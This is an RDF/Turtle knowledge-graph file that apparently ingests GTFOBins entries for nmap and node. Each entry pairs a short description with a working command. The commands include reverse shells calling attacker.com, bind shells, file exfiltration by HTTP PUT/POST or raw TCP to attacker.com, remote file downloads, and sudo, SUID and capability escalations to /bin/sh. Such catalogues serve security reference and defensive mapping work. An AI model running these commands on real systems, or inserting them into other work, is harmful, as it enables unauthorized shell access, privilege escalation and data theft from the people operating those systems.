mknd:command_nmap-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.",
        "Fetch a remote file via TCP. Run a proper HTTP server on the attacker box to send the file, e.g., `php -S 0.0.0.0:8080`. Note that multiple connections are made to the server and the result is placed in `$TF/IP/PORT/PATH`. Also, it is important that the port is a commonly used HTTP like 80 or 8080." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_file-download ;
    mknd:value """RHOST=attacker.com
RPORT=8080
TF=$(mktemp -d)
LFILE=file_to_save
nmap -p $RPORT $RHOST --script http-fetch --script-args http-fetch.destination=$TF,http-fetch.url=$LFILE
""",
        """export LPORT=12345
export LFILE=file_to_save
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
local d,x=c:receive("*a");
c:close();
local f=io.open(os.getenv("LFILE"), "wb");
f:write(d);
io.close(f);' > $TF
nmap --script=$TF
""" .

mknd:command_nmap-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_file-read ;
    mknd:value """TF=$(mktemp)
echo 'local f=io.open("file_to_read", "rb"); print(f:read("*a")); io.close(f);' > $TF
nmap --script=$TF
""" .

mknd:command_nmap-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
        "Send a local file via TCP. Run `socat -v tcp-listen:8080,reuseaddr,fork - on the attacker box to collect the file or use a proper HTTP server. Note that multiple connections are made to the server. Also, it is important that the port is a commonly used HTTP like 80 or 8080." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """RHOST=attacker.com
RPORT=8080
LFILE=file_to_send
nmap -p $RPORT $RHOST --script http-put --script-args http-put.url=/,http-put.file=$LFILE
""",
        """export RHOST=attacker.com
export RPORT=12345
export LFILE=file_to_send
TF=$(mktemp)
echo 'local f=io.open(os.getenv("LFILE"), 'rb')
local d=f:read("*a")
io.close(f);
local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
t:send(d);
t:close();' > $TF
nmap --script=$TF
""" .

mknd:command_nmap-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The payload appears inside the regular nmap output." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_file-write ;
    mknd:value """LFILE=file_to_write
nmap -oG=$LFILE DATA
""",
        """TF=$(mktemp)
echo 'local f=io.open("file_to_write", "wb"); f:write("data"); io.close(f);' > $TF
nmap --script=$TF
""" .

mknd:command_nmap-limited-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-limited-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Input echo is disabled." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_limited-suid ;
    mknd:value """TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
./nmap --script=$TF
""" .

mknd:command_nmap-non-interactive-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-non-interactive-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_non-interactive-bind-shell ;
    mknd:value """export LPORT=12345
TF=$(mktemp)
echo 'local k=require("socket");
local s=assert(k.bind("*",os.getenv("LPORT")));
local c=s:accept();
while true do
  local r,x=c:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));c:send(b);
end;c:close();f:close();' > $TF
nmap --script=$TF
""" .

mknd:command_nmap-non-interactive-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-non-interactive-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run ``nc -l -p 12345`` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_non-interactive-reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
TF=$(mktemp)
echo 'local s=require("socket");
local t=assert(s.tcp());
t:connect(os.getenv("RHOST"),os.getenv("RPORT"));
while true do
  local r,x=t:receive();local f=assert(io.popen(r,"r"));
  local b=assert(f:read("*a"));t:send(b);
end;
f:close();t:close();' > $TF
nmap --script=$TF
""" .

mknd:command_nmap-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Input echo is disabled.",
        "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_shell ;
    mknd:value """TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
nmap --script=$TF
""",
        """nmap --interactive
nmap> !sh
""" .

mknd:command_nmap-sudo a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-sudo" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Input echo is disabled.",
        "The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_sudo ;
    mknd:value """TF=$(mktemp)
echo 'os.execute("/bin/sh")' > $TF
sudo nmap --script=$TF
""",
        """sudo nmap --interactive
nmap> !sh
""" .

mknd:command_nmap-suid a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "nmap-suid" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "The payload appears inside the regular nmap output." ;
    d3f:uses mknd:executable_nmap ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_nmap ;
    mknd:provides mknd:function_suid ;
    mknd:value """LFILE=file_to_write
./nmap -oG=$LFILE DATA
""" .

mknd:command_node-bind-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-bind-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc target.com 12345` on the attacker box to connect to the shell." ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_bind-shell ;
    mknd:value """export LPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").createServer(function (client) {
  client.pipe(sh.stdin);
  sh.stdout.pipe(client);
  sh.stderr.pipe(client);
}).listen(process.env.LPORT)'
""" .

mknd:command_node-capabilities a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-capabilities" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_capabilities ;
    mknd:value """./node -e 'process.setuid(0); require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'
""" .

mknd:command_node-file-download a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-file-download" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Fetch a remote file via HTTP GET request." ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_file-download ;
    mknd:value """export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
node -e 'require("http").get(process.env.URL, res => res.pipe(require("fs").createWriteStream(process.env.LFILE)))'
""" .

mknd:command_node-file-read a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-file-read" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_file-read ;
    mknd:value "node -e 'process.stdout.write(require(\"fs\").readFileSync(\"/bin/ls\"))'" .

mknd:command_node-file-upload a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-file-upload" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Send a local file via HTTP POST request." ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_file-upload ;
    mknd:value """export URL=http://attacker.com
export LFILE=file_to_send
node -e 'require("fs").createReadStream(process.env.LFILE).pipe(require("http").request(process.env.URL))'
""" .

mknd:command_node-file-write a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-file-write" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_file-write ;
    mknd:value "node -e 'require(\"fs\").writeFileSync(\"file_to_write\", \"DATA\")'" .

mknd:command_node-reverse-shell a d3f:Command,
        owl:NamedIndividual ;
    rdfs:label "node-reverse-shell" ;
    d3f:created-by mknd:ingestion_log_gtfobins ;
    d3f:description "Run `nc -l -p 12345` on the attacker box to receive the shell." ;
    d3f:uses mknd:executable_node ;
    mknd:operating-system "Unix" ;
    mknd:provided-by mknd:executable_node ;
    mknd:provides mknd:function_reverse-shell ;
    mknd:value """export RHOST=attacker.com
export RPORT=12345
node -e 'sh = require("child_process").spawn("/bin/sh");
require("net").connect(process.env.RPORT, process.env.RHOST, function () {
  this.pipe(sh.stdin);
  sh.stdout.pipe(this);
  sh.stderr.pipe(this);
})'
""" .

